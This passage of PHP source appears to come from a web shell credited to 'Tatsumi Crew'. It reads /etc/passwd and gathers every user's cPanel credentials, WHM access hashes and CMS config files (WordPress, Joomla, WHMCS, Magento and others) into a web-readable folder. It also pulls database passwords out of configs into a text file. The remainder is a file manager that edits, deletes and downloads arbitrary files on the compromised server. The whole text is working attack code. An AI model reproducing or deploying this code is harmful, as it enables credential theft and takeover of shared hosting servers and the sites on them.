    elseif($uxl && preg_match('/DB_DATABASE/i',$uxl))
    {

    //Other

    $db=entre2v2($uxl,"DB_PASSWORD', '","');");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {

    //Other

    $db=entre2v2($uxl,"dbpass = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {

    //Other

    $db=entre2v2($uxl,"dbpass = '","';");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);

    }
    elseif($uxl && preg_match('/dbpass/i',$uxl))
    {

    //Other

    $db=entre2v2($uxl,"dbpass = \"","\";");
    if(!empty($db))
    $pass=$db."\n";
    fwrite($ffile,$pass);
    }


    }
    }
    echo "<center>
    <a href=\"santuy_symconf/root/\">Root Server</a>
    <br><a href=\"santuy_symconf/Passwords.txt\">Passwords</a>
    <br><a href=\"santuy_symconf/\">Configurations</a></center>";
    }
    else
    {
    echo "<center>
    <form method=\"POST\">
    <textarea name=\"passwd\" class='area' rows='15' cols='60'>";
    $file = '/etc/passwd';
    $read = @fopen($file, 'r');
    if ($read){
    $body = @fread($read, @filesize($file));
    echo "".htmlentities($body)."";
    }
    elseif(!$read)
    {
    $read = @show_source($file) ;
    }
    elseif(!$read)
    {
    $read = @highlight_file($file);
    }
    elseif(!$read)
    {
    for($uid=0;$uid<1000;$uid++)
    {
    $ara = posix_getpwuid($uid);
    if (!empty($ara))
    {
    while (list ($key, $val) = each($ara))
    {
    print "$val:";
    }
    print "\n";
    }}}

    flush();
     
    echo "</textarea>
    <p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
    </form></center>";
    }
    }
    }
    elseif($_GET['do'] == 'configv2') {
      if($_POST){
        $passwd = $_POST['passwd'];
        mkdir("santuy_config", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("santuy_config/.htaccess","w");
        fwrite($htc, $isi_htc);
        preg_match_all('/(.*?):x:/', $passwd, $user_config);
        foreach($user_config[1] as $user_noname) {
          $user_config_dir = "/home/$user_noname/public_html/";
          if(is_readable($user_config_dir)) {
            $grab_config = array(
              "/home/$user_noname/.my.cnf" => "cpanel",
              "/home/$user_noname/.accesshash" => "WHM-accesshash",
              "/home/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
              "/home/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
              "/home/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
              "/home/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
              "/home/$user_noname/public_html/whm/configuration.php" => "WHMCS",
              "/home/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
              "/home/$user_noname/public_html/forum/config.php" => "phpBB",
              "/home/$user_noname/public_html/sites/default/settings.php" => "Drupal",
              "/home/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
              "/home/$user_noname/public_html/app/etc/local.xml" => "Magento",
              "/home/$user_noname/public_html/joomla/configuration.php" => "Joomla",
              "/home/$user_noname/public_html/configuration.php" => "Joomla",
              "/home/$user_noname/public_html/wp/wp-config.php" => "WordPress",
              "/home/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
              "/home/$user_noname/public_html/wp-config.php" => "WordPress",
              "/home/$user_noname/public_html/admin/config.php" => "OpenCart",
              "/home/$user_noname/public_html/slconfig.php" => "Sitelok",
              "/home/$user_noname/public_html/application/config/database.php" => "Ellislab",
              "/home1/$user_noname/.my.cnf" => "cpanel",
              "/home1/$user_noname/.accesshash" => "WHM-accesshash",
              "/home1/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
              "/home1/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
              "/home1/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
              "/home1/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
              "/home1/$user_noname/public_html/whm/configuration.php" => "WHMCS",
              "/home1/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
              "/home1/$user_noname/public_html/forum/config.php" => "phpBB",
              "/home1/$user_noname/public_html/sites/default/settings.php" => "Drupal",           "/home1/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
              "/home1/$user_noname/public_html/app/etc/local.xml" => "Magento",
              "/home1/$user_noname/public_html/joomla/configuration.php" => "Joomla",
              "/home1/$user_noname/public_html/configuration.php" => "Joomla",
              "/home1/$user_noname/public_html/wp/wp-config.php" => "WordPress",
              "/home1/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
              "/home1/$user_noname/public_html/wp-config.php" => "WordPress",
              "/home1/$user_noname/public_html/admin/config.php" => "OpenCart",
              "/home1/$user_noname/public_html/slconfig.php" => "Sitelok",
              "/home1/$user_noname/public_html/application/config/database.php" => "Ellislab",
              "/home2/$user_noname/.my.cnf" => "cpanel",
              "/home2/$user_noname/.accesshash" => "WHM-accesshash",
              "/home2/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
              "/home2/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
              "/home2/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
              "/home2/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
              "/home2/$user_noname/public_html/whm/configuration.php" => "WHMCS",
              "/home2/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
              "/home2/$user_noname/public_html/forum/config.php" => "phpBB",
              "/home2/$user_noname/public_html/sites/default/settings.php" => "Drupal",
              "/home2/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
              "/home2/$user_noname/public_html/app/etc/local.xml" => "Magento",
              "/home2/$user_noname/public_html/joomla/configuration.php" => "Joomla",
              "/home2/$user_noname/public_html/configuration.php" => "Joomla",
              "/home2/$user_noname/public_html/wp/wp-config.php" => "WordPress",
              "/home2/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
              "/home2/$user_noname/public_html/wp-config.php" => "WordPress",
              "/home2/$user_noname/public_html/admin/config.php" => "OpenCart",
              "/home2/$user_noname/public_html/slconfig.php" => "Sitelok",
              "/home2/$user_noname/public_html/application/config/database.php" => "Ellislab",
              "/home3/$user_noname/.my.cnf" => "cpanel",
              "/home3/$user_noname/.accesshash" => "WHM-accesshash",
              "/home3/$user_noname/public_html/bw-configs/config.ini" => "BosWeb",
              "/home3/$user_noname/public_html/config/koneksi.php" => "Lokomedia",
              "/home3/$user_noname/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
              "/home3/$user_noname/public_html/clientarea/configuration.php" => "WHMCS",
              "/home3/$user_noname/public_html/whm/configuration.php" => "WHMCS",
              "/home3/$user_noname/public_html/whmcs/configuration.php" => "WHMCS",
              "/home3/$user_noname/public_html/forum/config.php" => "phpBB",
              "/home3/$user_noname/public_html/sites/default/settings.php" => "Drupal",
              "/home3/$user_noname/public_html/config/settings.inc.php" => "PrestaShop",
              "/home3/$user_noname/public_html/app/etc/local.xml" => "Magento",
              "/home3/$user_noname/public_html/joomla/configuration.php" => "Joomla",
              "/home3/$user_noname/public_html/configuration.php" => "Joomla",
              "/home3/$user_noname/public_html/wp/wp-config.php" => "WordPress",
              "/home3/$user_noname/public_html/wordpress/wp-config.php" => "WordPress",
              "/home3/$user_noname/public_html/wp-config.php" => "WordPress",
              "/home3/$user_noname/public_html/admin/config.php" => "OpenCart",
              "/home3/$user_noname/public_html/slconfig.php" => "Sitelok",
              "/home3/$user_noname/public_html/application/config/database.php" => "Ellislab"
                );  
              foreach($grab_config as $config => $nama_config) {
                $ambil_config = file_get_contents($config);
                if($ambil_config == '') {
                } else {
                  $file_config = fopen("santuy_config/$user_owl-$nama_config.txt","w");
                  fputs($file_config,$ambil_config);
                }
              }
            }   
          }
          echo "<center><a href='?dir=$dir/santuy_config'><font color=lime>Done</font></a></center>";
          }else{
            
        echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo file_get_contents('/etc/passwd'); 
        echo "</textarea><br><input type=\"submit\" value=\"Gasss Cok!\"></td></tr></center>\n";
            }
 } elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=maroon>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=maroon>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=maroon>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    $delete_dir = rmdir($dir);
    if($delete_dir) {
        $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
        $act = "<font color=maroon>could not remove ".basename($dir)."</font>";
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=green>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=green>Saved!</font>";
        } else {
            $act = "<font color=maroon>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=green>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=maroon>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=green>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=maroon>permission denied</font>";
    }
    echo $act;
} else {
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            echo "<font color=maroon>can't open directory. ( not readable )</font>";
        } else {
            echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
            <tr>
            <th class="th_home"><center>Name</center></th>
            <th class="th_home"><center>Type</center></th>
            <th class="th_home"><center>Size</center></th>
            <th class="th_home"><center>Last Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Action</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                $dtype = filetype("$dir/$dirx");
                $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                if(function_exists('posix_getpwuid')) {
                    $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                    $downer = $downer['name'];
                } else {
                    //$downer = $uid;
                    $downer = fileowner("$dir/$dirx");
                }
                if(function_exists('posix_getgrgid')) {
                    $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                    $dgrp = $dgrp['name'];
                } else {
                    $dgrp = filegroup("$dir/$dirx");
                }
                if(!is_dir("$dir/$dirx")) continue;
                if($dirx === '..') {
                    $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
                } elseif($dirx === '.') {
                    $href = "<a href='?dir=$dir'>$dirx</a>";
                } else {
                    $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
                }
                if($dirx === '.' || $dirx === '..') {
                    $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                    } else {
                    $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
                }
                echo "<tr>";
                echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
                echo "<td class='td_home'><center>$dtype</center></td>";
                echo "<td class='td_home'><center>-</center></th></td>";
                echo "<td class='td_home'><center>$dtime</center></td>";
                echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                echo "</tr>";
            }
        }
    } else {
        echo "<font color=maroon>can't open directory.</font>";
    }
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if(function_exists('posix_getpwuid')) {
                $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                $fowner = $fowner['name'];
            } else {
                //$downer = $uid;
                $fowner = fileowner("$dir/$file");
            }
            if(function_exists('posix_getgrgid')) {
                $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                $fgrp = $fgrp['name'];
            } else {
                $fgrp = filegroup("$dir/$file");
            }
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
            echo "<td class='td_home'><center>$ftype</center></td>";
            echo "<td class='td_home'><center>$size</center></td>";
            echo "<td class='td_home'><center>$ftime</center></td>";
            echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
            echo "</tr>";
        }
        echo "</table>";
        if(!is_readable($dir)) {
            //
        } else {
        }
        echo '</table></div>';
    }
    echo '</body></html>';
    function perms($file)
    {
        $perms = fileperms($file);
        if (($perms & 0xC000) == 0xC000) {
            $info = 's';
        } elseif (($perms & 0xA000) == 0xA000) {
            $info = 'l';
        } elseif (($perms & 0x8000) == 0x8000) {
            $info = '-';
        } elseif (($perms & 0x6000) == 0x6000) {
            $info = 'b';
        } elseif (($perms & 0x4000) == 0x4000) {
            $info = 'd';
        } elseif (($perms & 0x2000) == 0x2000) {
            $info = 'c';
        } elseif (($perms & 0x1000) == 0x1000) {
            $info = 'p';
        } else {
            $info = 'u';
        }
        $info .= (($perms & 0x0100) ? 'r' : '-');
        $info .= (($perms & 0x0080) ? 'w' : '-');
        $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
        $info .= (($perms & 0x0020) ? 'r' : '-');
        $info .= (($perms & 0x0010) ? 'w' : '-');
        $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
        $info .= (($perms & 0x0004) ? 'r' : '-');
        $info .= (($perms & 0x0002) ? 'w' : '-');
        $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
        return $info;
    }
    echo '<br><br><center><i>Copyright &copy; 2018 - <a href="http://zerobyte.id/">./p0tz </a>- Tatsumi Crew</i></center><br>';
    ?>
